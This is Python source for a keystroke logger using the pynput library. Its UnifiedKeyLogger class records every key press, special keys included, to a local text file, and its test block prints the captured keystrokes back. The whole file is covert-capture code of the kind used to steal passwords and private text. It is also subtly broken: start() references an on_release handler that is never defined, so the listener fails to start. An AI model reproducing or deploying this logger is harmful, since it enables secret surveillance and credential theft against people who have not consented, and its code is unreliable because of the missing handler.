import os
import threading
import time
import json
from datetime import datetime

from pynput import keyboard


class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log_buffer = []
        self.is_running = False
        self.thread = None
        
        # Ensure log file exists
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w') as f:
                f.write("Keylogger started at {0}\n".format(datetime.now()))
                f.write("=" * 50 + "\n")
    
    def log_keystroke(self, key_data):
        """Log keystroke to buffer and file"""
        # Add to buffer
        self.log_buffer.append(key_data)
        
        # Write to file
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(key_data)
                f.flush()
        except Exception as e:
            print("Error writing to log file: {0}".format(e))

class UnifiedKeyLogger(KeyLogger):
    """Unified keylogger using pynput"""
    
    def __init__(self, log_file="keylog.txt"):
        super().__init__(log_file)
        self.listener = None
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            if hasattr(key, 'char') and key.char:
                # Regular alphanumeric keys
                self.log_keystroke(key.char)
            else:
                # Special keys
                self.log_keystroke("[{0}]".format(str(key).replace('Key.', '').upper()))
                
        except Exception as e:
            self.log_keystroke("[ERROR: {0}]".format(str(e)))
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            return False
        
        self.is_running = True
        self.log_keystroke("=== KEYLOGGER STARTED ===")
        
        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.daemon = True
            self.listener.start()
            return True
        except Exception as e:
            self.log_keystroke("[KEYLOGGER START ERROR: {0}]".format(str(e)))
            return False
    
    def stop(self):
        """Stop the keylogger"""
        if not self.is_running:
            return False
        
        self.is_running = False
        self.log_keystroke("=== KEYLOGGER STOPPED ===")
        
        if self.listener:
            self.listener.stop()
        
        return True


def create_keylogger(log_file="keylog.txt"):
    """Factory function to create appropriate keylogger"""
    return UnifiedKeyLogger(log_file)


# Test the keylogger (for standalone testing)
if __name__ == "__main__":
    print("Testing keylogger...")
    keylogger = create_keylogger("test_keylog.txt")
    
    if keylogger.start():
        print("Keylogger started. Type something and press Ctrl+C to stop...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            keylogger.stop()
            print("\nKeylogger stopped.")
            
            # Show logged keys
            try:
                with open("test_keylog.txt", 'r') as f:
                    print("\nLogged keystrokes:")
                    print(f.read())
            except:
                print("Could not read log file.")
    else:
        print("Failed to start keylogger.")